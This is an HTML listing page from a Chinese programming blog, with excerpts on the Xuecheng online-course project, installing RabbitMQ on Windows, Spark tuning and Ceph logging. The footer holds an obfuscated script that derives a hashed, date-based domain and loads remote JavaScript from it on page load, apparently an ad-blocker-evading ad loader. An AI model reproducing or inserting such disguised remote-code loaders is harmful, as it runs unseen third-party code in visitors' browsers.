			<a href="/posts/101471acebafde7cd27baf0f3a4f64e5/" rel="bookmark">
			学成在线项目（个人精简升级）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 在各位看官开始阅读前，请注意以下须知：
本文在实现学成在线项目时，不是根据视频一步一步进行，而是总览需求文档，根据自身关注点，挑选重点着重讲解与实现，其他部分则会通过自研templates一步完成本文会对一些关注点进行“魔改”，魔改的出发点有两个：1.增加难度；2.效果更好 本文的目录结构如下：
目录 前言1. 基础实现部1.1 项目框架搭建1.2 数据库建立1.3 基本功能一键生成1.4 单元测试（从service再到api）1.5 前后端联调 2. 扩展实现部2.1 媒资管理2.1.1 Minio恢复数据原理浅析 2.1.2 断点续传2.1.3 任务调度中心 2.2 认证授权2.2.1 jwt令牌简介2.2 Spring Security启动类做了哪些事？@EnableWebSecurity@EnableResourceServer 言归正传，接下来开始介绍学成在线项目的实现
1. 基础实现部 1.1 项目框架搭建 项目采用（父工程（基础工程+聚合服务工程））的三层结构，父工程统合版本信息，基础工程实现全局依赖功能，聚合服务工程针对特定功能组做聚合与整体打包（内部还可继续细分子工程，但仅包含一个启动类），我们以仅包含内容管理聚合服务的图解释该三层模型：
我们以下图解释聚合服务工程：
聚合服务工程将MVC架构具象化为三个子工程，分别是映射数据库的数据模型工程，依赖于数据模型工程执行业务的业务工程，与前端交换数据的接口工程（依赖前两个工程），并建立一个聚合工程统一管理三个模块，体现在pom文件里如下：
&lt;modules&gt; &lt;module&gt;xuecheng-plus-content-api&lt;/module&gt; &lt;module&gt;xuecheng-plus-content-model&lt;/module&gt; &lt;module&gt;xuecheng-plus-content-service&lt;/module&gt; &lt;/modules&gt; 聚合服务工程仅在接口工程下建立SpringBoot的启动类，业务工程与数据模型工程通过jar包依赖注入接口工程。由于聚合服务工程均在统一文件结构下，因此接口工程的启动类扫描时，可以将业务工程与数据模型工程的Bean注入到容器中
这里额外说明一个知识，@SpringBootApplication默认扫描启动类所在包及其下属包，如果要添加其他的路径，须通过以下声明@SpringBootApplication(scanBasePackages = “com.xxx”)
1.2 数据库建立 直接拿项目给的sql生成
1.3 基本功能一键生成 利用自定义模板统一生成了dao, service, api层代码，然后放在各自的模块下
1.4 单元测试（从service再到api） 首先需要明确，dao不需要单元测试，因为dao只存放持久层模型，即po，没有业务逻辑所以不需要测试
service有两部分需要单元测试，一种是由模板一键生成的mapper业务，测试其对数据库的基本访问是否完备；一种是人工编程的service业务，测试其对数据的处理与返回是否合适
api主要测试其对数据的处理与返回，测试分两步进行：
使用Spring自带的单元测试主要测试的是接口的处理逻辑测试返回给前端的数据是否合适： 使用HTTP-Client工具测试返回给前端的数据是否合适（该测试方法全面且简便）也可以使用Swagger文档测试，Swagger文档使用时需要注意，其无法解析泛型类，无法解析与测试以Map收集的参数。因此，利用Swagger文档测试接口时，如果是以路径请求参数，必须分开导入，如果是以Body请求参数，必须创建对象接收。像下面这样的扩展性强（不限制传参个数）的接口定义就只能利用HTTP-Client测试： public Results GetCourseBasePageList(@RequestParam Map&lt;String,Object&gt; params) 1.5 前后端联调 跨域是什么：跨域是浏览器禁止访问非同源资源（同源即协议、主机、端口完全一致）跨域的三种解决方案： 使用JSONP访问服务端添加请求头Access-Control-Allow-Origin：*，可通过Spring提供的CorsFilter过滤浏览器请求同源nginx服务器，由nginx发放静态资源以及代理对服务端的访问 2. 扩展实现部 扩展实现部分主要介绍我比较感兴趣的，以前没有接触到的一些技术选型，不会涉及项目实现的所有内容
2.1 媒资管理 媒资管理只负责文件（图片、视频等）的上传与下载接口开发，以及维护文件信息表（该表一般不向外暴露接口，而是由内部的上传下载接口做访问与修改）
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/101471acebafde7cd27baf0f3a4f64e5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/99bbfc55926bb7bc63db135ea5f665ca/" rel="bookmark">
			Windows下的RabbitMq安装（图文教学）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 前言一、安装Erlang1、下载地址： https://www.erlang.org/downloads2、安装3、配置环境变量4、测试安装 二、安装RabbitMq1、下载2、安装3、常用命令 参考 前言 RabbitMQ服务端代码是使用并发式语言Erlang编写的，安装Rabbit MQ的前提是安装Erlang （ https://www.erlang.org/downloads ）。同时，在安装RabbitMQ 时需要注意RabbitMQ 与Erlang的对应版本，防止安装过程中出错。一般情况下，版本均选择新版本不会有太大问题，但还是需要注意下。可以参考RabbitMQ 的社区，里面有介绍版本号及推荐的Erlang版本。
一、安装Erlang 1、下载地址： https://www.erlang.org/downloads 可以选择最新的下载，在确定RabbitMq的版本时，需要选择对应版本。进入主页，打开对应版本。
RabbitMq 3.8.15 该版本需要Erlang / OTP 23.2，并且是第一个支持Erlang 24的版本。
2、安装 下载后，全程傻瓜式安装。自己可以选择安装目录。
3、配置环境变量 (1) 添加系统变量 ERLANG_HOME
(2) 修改系统变量 PATH，添加 %ERLANG_HOME%\bin
4、测试安装 Win+R打开运行，输入cmd进入黑窗口。输入 erl，出来版本号即成功。
二、安装RabbitMq 1、下载 https://www.rabbitmq.com/download.html
下载完后会得到：
2、安装 （1）也是傻瓜式安装，双击就好了。然后会出来下图：
（2）管理员win+r cmd 打开黑窗口，复制你mq安装路径的sbin路径，进入对应文件。
（3）安装web管理工具，输入： rabbitmq-plugins enable rabbitmq_management
（4）输入rabbitmqctl status检查是否安装成功。
（5）之后找到对应安装目标的sbin文件下找到 rabbitmq-server.bat 双击启动。
打开 http://localhost:15672/ 查看是否出来页面
账号密码初始都是 guest
至此安装完毕。。。
3、常用命令 基于rabbitmqctl.bat
停用服务
rabbitmqctl stop
查看用户列表
rabbitmqctl list_users
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/99bbfc55926bb7bc63db135ea5f665ca/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a2b330ad810ccc42f57385940ec7e4c9/" rel="bookmark">
			【Spark】Spark调优（一）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 一、任务优化
1、调大分配资源
2、提高并行度
3、RDD的重用和持久化
4、使用广播变量
5、避免使用shuffle类算子
6、使用高性能的算子
7、Kryo序列化
8、Spark内存模型调优
二、参数
1、动态资源分配
2、推测机制 一、任务优化 1、调大分配资源 SparkC ontext，DAGScheduler，TaskScheduler，会将算子，切割成大量的task，提交到worker节点的executor上去执行
1、增加executor
如果executor数量比较少，那么，能够并行执行的task数量就比较少，就意味着，我们的Application的并行执行的能力就很弱。比如有3个executor，每个executor有2个cpucore，那么同时能够并行执行6个task。6个执行完以后，再换下一批6个task。增加了executor数量以后，那么，就意味着，能够并行执行的task数量，也就变多了。
2、增加每个executor的cpu core
相当于增加了执行的并行能力。原本20个executor，每个有2个Cpu core。能够并行执行的task数量是40个。现在每个executor的cpu core,增加到了10个。能够并行执行的task数量是100个。执行的速度，提升了5倍。
3、增加每个executor的内存量
在资源允许的情况下，增加了内存量以后，对性能的提升，有三点:
1、如果需要对RDD进行cache，那么更多的内存，就可以缓存更多的数据，将更少的数据
写入磁盘，甚至不写入磁盘，减少了磁盘IO。
2、对于shuffle操作，reduce端， 会需要内存来存放拉取的数据并进行聚合。如果内存不够
也会写入磁盘。如果给executor分配更多内存以后，就有更少的数据，需要写入磁盘，甚至不需要写入磁盘，减少了磁盘IO，提升了性能。
3、对于task的执行， 可能会创建很多对象。如果内存比较小，可能会频繁导致JVM堆内存满了，然后频繁GC，垃圾回收(速度很慢)，内存加大以后，带来更少的GC，避免了速度变慢，提升性能。
4、增加driver的内存大小
增加了driver的内存大小，有利于driver端可以存储更多的数据，有利于避免OOM。
比如:提交任务时可能出现的异常信息java.lang.OutOfMemoryError: GC overhead limit exceeded 可能导致该异常的原因:
当前一个rdd的数据量非常的大，然后针对于这个rdd执行了collect算子操作，它会把
rdd的所有数据转换成数组，拉到driver端。由于driver内存有限，存不下这些数据，就会导致出现OOM异常，这个时候就可以增加driver的内存大小。
2、提高并行度 1、设置task的数量
至少设置成与spark Application 的总cpu core 数量相同。最理想情况，150个core，分配150task。官方推荐，task数量，设置成spark Application 总cpu core数量的2~3倍。
设置参数spark.default.parallelism，默认是没有值的，只有设置了值，它会在shuffle的过程才会起作用。可以通过在构建SparkConf对象的时候设置，例如：
new SparkConf().set("spark.defalut.parallelism","500")
2、提高sparksql运行的task数量
可以适当增大sparksql运行的task数量，来提高并行度。 比如设置为：
spark.sql.shuffle.partitions=500（默认为200）
3、给RDD重新设置partition的数量
使用rdd.repartition 来重新分区，该方法会生成一个新的rdd，并使其分区数变大。由于一个partition对应一个task，那么对应的task个数越多，通过这种方式也可以提高并行度。 3、RDD的重用和持久化 1、可以调用rdd的cache或者persist方法进行持久化
（1）cache方法默认是把数据持久化到内存中
（2）persist方法中有丰富的缓存级别
cache和persist的区别
/** Persist this RDD with the default storage level (`MEMORY_ONLY`).
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a2b330ad810ccc42f57385940ec7e4c9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0494909ed4525b50a4b38a244b61fc31/" rel="bookmark">
			ceph分布式存储-日志和调试
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		ceph分布式存储-日志和调试 1. 介绍 Log 是每个项目必须的，他是跟踪问题的最直接的依据。Ceph 也设计自己的log机制。
一般来说，你应该在运行时增加调试选项来调试问题；也可以把调试选项添加到 Ceph 配置文件里来调试集群启动时的问题，然后查看 /var/log/ceph （默认位置）下的日志文件。
Tip： 调试输出会拖慢系统，这种延时有可能掩盖竞争条件。
日志记录是资源密集型任务。如果你碰到的问题在集群的某个特定区域，只启用那个区域对应的日志功能即可。例如，你的 OSD 运行良好、元数据服务器却有问题，这时应该先打开那个可疑元数据服务器实例的调试日志；如果不行再打开各子系统的日志。
重要： 详尽的日志每小时可能超过 1GB ，如果你的系统盘满了，这个节点就会停止工作。
如果你要打开或增加 Ceph 日志级别，确保有足够的系统盘空间。滚动日志文件的方法见下面的 加快日志更迭 小节。集群稳定运行后，可以关闭不必要的调试选项以优化运行。集群在运行中记录调试输出信息会拖慢系统、且浪费资源。
2. 运行时 要在运行时激活 Ceph 的调试输出（即 dout() ），用 ceph tell 命令把参数注入运行时配置：
ceph tell {daemon-type}.{daemon id or *} injectargs --{name} {value} [--{name} {value}] 用 osd 、 mon 或 mds 替代 {daemon-type} 。还可以用星号（ * ）把配置应用到同类型的所有守护进程，或者指定具体守护进程的 ID 。例如，要给名为 ods.0 的 ceph-osd 守护进程提高调试级别，用下列命令：
ceph tell /run/ceph/ceph-osd.0.asok injectargs --debug-osd 0/5 ceph tell 命令会通过 monitor 起作用。如果你不能绑定 monitor，仍可以登录你要改的那台主机然后用 ceph daemon 来更改。例如：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0494909ed4525b50a4b38a244b61fc31/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/posts/page/144/">«</a>
	<span class="pagination__item pagination__item--current">145/578</span>
	<a class="pagination__item pagination__item--next btn" href="/posts/page/146/">»</a>
</div>

			</div>
			

		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程随想.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151182"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>